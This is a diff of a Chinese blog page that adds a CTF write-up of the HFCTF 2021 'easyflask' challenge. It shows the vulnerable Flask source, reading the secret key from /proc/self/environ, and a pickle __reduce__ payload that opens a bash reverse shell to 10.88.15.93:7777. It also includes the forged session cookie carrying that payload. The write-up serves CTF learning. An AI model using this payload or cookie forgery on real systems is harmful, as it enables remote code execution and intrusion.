+<h1 id="CTF例题实战"><a href="#CTF例题实战" class="headerlink" title="CTF例题实战"></a>CTF例题实战</h1><h2 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h2><p>这个题目我当初做的时候记得是flask的cookie伪造，怎么在Python反序列化这里看到了，后面回去看了一下发现还是太年轻了，当时根本没深入，只顾着拿flag了</p>
+<p>我们先读取到源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())<span class="comment">#注意这里使用序列化构成session中的u</span></span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_handler</span>():</span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>由于可以进行任意文件读取，key我们可以很快的读取到，但是问题在于</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>): <span class="comment">#检查u是否为字典类型</span></span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>)) <span class="comment">#获取到b的值然后进行base64解码</span></span><br><span class="line">        u = pickle.loads(u) <span class="comment">#对其进行反序列化</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到，即使我们拿到了密匙然后伪造了session，但是还是拿不到flag，需要我们需要在反序列化的地方进行命令执行，而且命令执行结果是不会返回的，也就是我们只能进行无回显RCE</p>
+<p>我们先将我们的cookie进行解码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;u&quot;</span>:&#123;<span class="string">&quot; b&quot;</span>:<span class="string">&quot;gASVGAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlC4=&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到再进行解码一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line">a = pickle.loads(base64.b64decode(</span><br><span class="line">    <span class="string">b&#x27;gASVGAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlC4=&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#test</span></span><br></pre></td></tr></table></figure>
+
+<p>DS说实际上是所有信息都传递了，只不过输出的时候只会触发<code>__repr__</code>输出uname，但是我们做题的重点不在这里</p>
+<p>我们先读取密匙<code>/proc/self/environ</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">glzjin22948575858jfjfjufirijidjitg3uiiuuh</span><br></pre></td></tr></table></figure>
+
+<p>然后准备反序列化数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.88.15.93/7777 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br><span class="line"><span class="comment">#gASVSwAAAAAAAACMAm50lIwGc3lzdGVtlJOUjDNiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjg4LjE1LjkzLzc3NzcgMD4mMSeUhZRSlC4=</span></span><br></pre></td></tr></table></figure>
+
+<p>由于没有回显，直接反弹shell，不知道是不是opcode的原因，必须在Linux系统中运行</p>
+<p>然后进行session伪造</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">&quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;</span> -t <span class="string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;Y3Bvc2l4CnN5c3RlbQpwMAooUyJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjg4LjE1LjkzLzc3NzcgMD4mMSciCnAxCnRwMgpScDMKLg==&#x27;&#125;&#125;&quot;</span></span><br><span class="line"><span class="comment">#eyJ1Ijp7ImIiOiJZM0J2YzJsNENuTjVjM1JsYlFwd01Bb29VeUppWVhOb0lDMWpJQ2RpWVhOb0lDMXBJRDRtSUM5a1pYWXZkR053THpFd0xqZzRMakUxTGprekx6YzNOemNnTUQ0bU1TY2lDbkF4Q25Sd01ncFNjRE1LTGc9PSJ9fQ.aNzsiQ.p5w9Ky7Q2pBwYLmpzFvpUrzKcgs</span></span><br></pre></td></tr></table></figure>
+
+<p>这个题目好像每次访问都会重新设置一下session，所以要抓包发</p>
+
+
+
+
+<p>直接读flag</p>
+
+
+
+
 
   </div>
   
@@ -2684,10 +2979,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-05-23T21:15:41+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-10-01T22:09:25+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：May 23, 2025</p>
+    <p>更新于：Oct 1, 2025</p>
   </a>
 </div>
 
@@ -2831,7 +3126,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">1.序列化和反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-JSON"><span class="toc-text">2.JSON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">3.Python反序列化相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-dump%E5%92%8Cdumps%E5%87%BD%E6%95%B0"><span class="toc-text">1.dump和dumps函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-load%E5%92%8Cloads%E5%87%BD%E6%95%B0"><span class="toc-text">2.load和loads函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">1.Python反序列化相关函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">2.反序列化相关魔术方法</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">1.序列化和反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-JSON"><span class="toc-text">2.JSON</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">3.Python反序列化相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-dump%E5%92%8Cdumps%E5%87%BD%E6%95%B0"><span class="toc-text">1.dump和dumps函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-load%E5%92%8Cloads%E5%87%BD%E6%95%B0"><span class="toc-text">2.load和loads函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">1.Python反序列化相关函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9B%B8%E5%85%B3%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">2.反序列化相关魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PVM"><span class="toc-text">PVM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84opcode"><span class="toc-text">常用的opcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%86%99opcode"><span class="toc-text">手写opcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF-2021-Final-easyflask"><span class="toc-text">[HFCTF 2021 Final]easyflask</span></a></li></ol>
     </div>
   </section>
 
@@ -3401,7 +3696,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/05/23/Python反序列化/","name":"Python反序列化"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Python反序列化","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/05/23/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/05/23/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","wordCount":0,"datePublished":"2025-05-23T04:51:52.000Z","dateModified":"2025-05-23T13:15:41.377Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/05/23/Python反序列化/","name":"Python反序列化"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Python反序列化","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/05/23/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2025/05/23/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","wordCount":0,"datePublished":"2025-05-23T04:51:52.000Z","dateModified":"2025-10-01T14:09:25.416Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
